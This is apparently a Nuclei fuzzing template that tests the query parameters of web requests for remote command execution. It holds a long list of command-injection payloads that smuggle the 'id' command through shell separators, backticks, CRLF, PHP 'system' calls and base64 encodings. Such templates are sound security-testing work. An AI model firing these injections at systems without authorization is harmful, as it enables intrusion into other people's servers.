http:
- extractors:
  - regex:
    - (u|g)id=.*
    type: regex
  fuzzing:
  - fuzz:
    - '{{rce}}'
    mode: single
    part: query
    type: postfix
  matchers:
  - condition: or
    type: word
    words:
    - '''id'' is not recognized as an internal or external command'
    - syntax error near unexpected token `
  - condition: and
    part: body
    type: word
    words:
    - uid=
    - gid=
  - condition: and
    part: body
    type: word
    words:
    - PHP Extension
    - PHP Version
  - type: word
    words:
    - This is perl
  matchers-condition: or
  payloads:
    rce:
    - '||/usr/bin/id||'
    - $;id
    - 1;id
    - ;";id
    - ;";id;
    - '& `id`'
    - '& id &'
    - '& id'
    - '&$(id)'
    - '&& id'
    - '&&$(id)'
    - '&&`id`'
    - '&&id'
    - '&&id&&'
    - '&`id`'
    - '&id'
    - '&id&'
    - );id
    - );id;
    - );id|
    - ')id '
    - )|id
    - )|id;
    - ; $(id)
    - '; `id` #'
    - ; `id`
    - ; id
    - ; id;
    - '; id

      '
    - ; id|
    - ; |id|
    - '

      &&id'
    - '

      ;id'
    - '

      id'
    - '

      id

      '
    - '

      ||$(id)'
    - '

      ||`id`'
    - '

      ||id'
    - "\r&&id"
    - "\r;id"
    - "\r\n&&id&&"
    - "\r\n;id"
    - "\r\n||$(id)"
    - "\r\n||`id`"
    - "\r\n||id"
    - "\r\n||id||"
    - "\r||$(id)"
    - "\r||`id`"
    - "\r||id"
    - a);id
    - a);id|
    - a;id
    - a;id;
    - '| `id` #'
    - '| `id`'
    - '| id'
    - '|id'
    - '|id;'
    - '|id|'
    - '|| `id` #'
    - '|| `id`'
    - '|| id'
    - '||$(id)'
    - '||$(id);'
    - '||$(id)||'
    - '||`id`'
    - '||`id`||'
    - '||id'
    - '||id;'
    - '||id|'
    - '||id||'
    - '"><?php echo system("id");?>'
    - ; echo `id`;
    - ; echo exec(id);
    - echo exec(id);
    - YGlkYA==
    - O2BpZGA7
    - O2lkOw==
    - fHxgaWRgfHw=
    - JiZpZCYm
  pre-condition:
  - dsl:
    - method == "GET"
    type: dsl
  stop-at-first-match: true
id: rce-query
info:
  author: reewardius
  name: Remote Code Execution
  severity: critical
  tags: fuzzing-req,fuzzing-req-rce,fuzzing-req-body-query,fuzzing-req-rce-body-query,fuzzing-req-query,rce,dast
